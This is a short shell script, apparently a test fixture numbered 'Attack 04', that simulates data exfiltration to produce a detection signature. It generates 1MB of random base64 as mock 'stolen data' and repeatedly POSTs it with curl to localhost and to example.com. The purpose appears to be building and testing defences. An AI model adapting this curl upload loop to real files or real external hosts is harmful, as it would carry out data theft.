#!/bin/sh
# Attack 04: Data exfiltration
# Signature: high net_send, near-zero net_recv (tx >> rx), large payloads
# Simulates: attacker uploading stolen data to an external server
END=$(($(date +%s) + ${1:-20}))
# Create a fake "stolen data" blob (1MB of random)
BLOB=$(dd if=/dev/urandom bs=1024 count=1024 2>/dev/null | base64 | head -c 1000000)
while [ "$(date +%s)" -lt "$END" ]; do
  # POST large payloads to a target. The target may reject, but the SEND
  # syscalls fire regardless — that's the signal we want.
  echo "$BLOB" | curl -s -m 3 -X POST -d @- -o /dev/null http://localhost:3000/ 2>/dev/null
  echo "$BLOB" | curl -s -m 3 -X POST -d @- -o /dev/null http://example.com/ 2>/dev/null
done
